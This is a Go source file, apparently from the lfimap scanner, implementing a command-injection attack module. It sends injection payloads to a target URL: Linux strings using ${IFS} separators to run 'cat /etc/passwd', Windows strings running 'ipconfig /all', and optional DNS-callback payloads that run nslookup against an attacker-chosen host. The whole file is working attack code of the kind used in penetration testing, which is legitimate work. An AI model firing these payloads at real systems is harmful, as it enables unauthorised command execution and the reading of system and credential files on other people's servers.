package attacks

import (
	"fmt"
	"math/rand"
	"net/url"

	lfihttp "github.com/hansmach1ne/lfimap/internal/http"
)

// CMDIAttack implements command injection attack
type CMDIAttack struct{}

// Name returns the attack name
func (a *CMDIAttack) Name() string {
	return "cmd"
}

// Test executes the command injection attack
func (a *CMDIAttack) Test(ctx *AttackContext, targetURL, postData string) bool {
	if ctx.Verbose {
		fmt.Printf("%s Testing command injection...\n", ctx.Colors.Blue("[i]"))
	}

	placeholder := ctx.Config.Args.Placeholder
	headers := lfihttp.HeadersToMap(lfihttp.InitHeaders(
		ctx.Config.Args.UserAgent,
		ctx.Config.Args.Referer,
		ctx.Config.Args.Cookie,
	))

	// Linux command injection payloads
	// 1;cat${IFS}/etc/passwd;#${IFS}';cat${IFS}/etc/passwd;#${IFS}";cat${IFS}/etc/passwd;#${IFS}
	linuxPayload := url.QueryEscape("1;cat${IFS}/etc/passwd;#${IFS}';cat${IFS}/etc/passwd;#${IFS}\";cat${IFS}/etc/passwd;#${IFS}")

	// Windows command injection payloads
	// 1&ipconfig /all&`ipconfig /all`&"1&ipconfig /all&`ipconfig /all`&
	windowsPayload := url.QueryEscape("1&ipconfig /all&`ipconfig /all`&\"1&ipconfig /all&`ipconfig /all`&")

	tests := []string{linuxPayload, windowsPayload}

	// Add DNS callback payloads if callback is specified
	if ctx.Config.Args.Callback != "" {
		callback := ctx.Config.Args.Callback

		// Generate random alphanumeric strings for DNS subdomain
		r1 := randomAlphanumeric(5)
		r2 := randomAlphanumeric(5)
		r3 := randomAlphanumeric(5)
		r4 := randomAlphanumeric(5)
		r5 := randomAlphanumeric(5)
		r6 := randomAlphanumeric(5)
		r7 := randomAlphanumeric(5)

		// Linux DNS callback
		// 1;nslookup${IFS}{random1}.{callback};#${IFS}';nslookup${IFS}{random2}.{callback};#${IFS}";nslookup${IFS}{random3}.{callback};#${IFS}
		linuxDNS := url.QueryEscape(fmt.Sprintf(
			"1;nslookup${IFS}%s.%s;#${IFS}';nslookup${IFS}%s.%s;#${IFS}\";nslookup${IFS}%s.%s;#${IFS}",
			r1, callback, r2, callback, r3, callback,
		))

		// Windows DNS callback
		windowsDNS := url.QueryEscape(fmt.Sprintf(
			"1&nslookup %s.%s&`nslookup %s.%s`&\"1&nslookup %s.%s&`nslookup %s.%s`&",
			r4, callback, r5, callback, r6, callback, r7, callback,
		))

		tests = append(tests, linuxDNS, windowsDNS)
	}

	for _, test := range tests {
		u, reqHeaders, postTest := lfihttp.PrepareRequest(placeholder, test, targetURL, postData, headers, ctx.Encodings)
		result := lfihttp.Request(ctx.HTTPCtx, u, reqHeaders, postTest, "RCE", "CMD", false, false, false)

		if !result.DoContinue {
			return true
		}

		if ctx.Quick {
			return false
		}
	}

	// Print info about checking DNS listener if callback was used
	if ctx.Config.Args.Callback != "" {
		fmt.Printf("%s Check your DNS listener at '%s' for incoming lookups\n",
			ctx.Colors.LightBlue("[i]"), ctx.Config.Args.Callback)
	}

	return false
}

// randomAlphanumeric generates a random alphanumeric string of length n
func randomAlphanumeric(n int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}
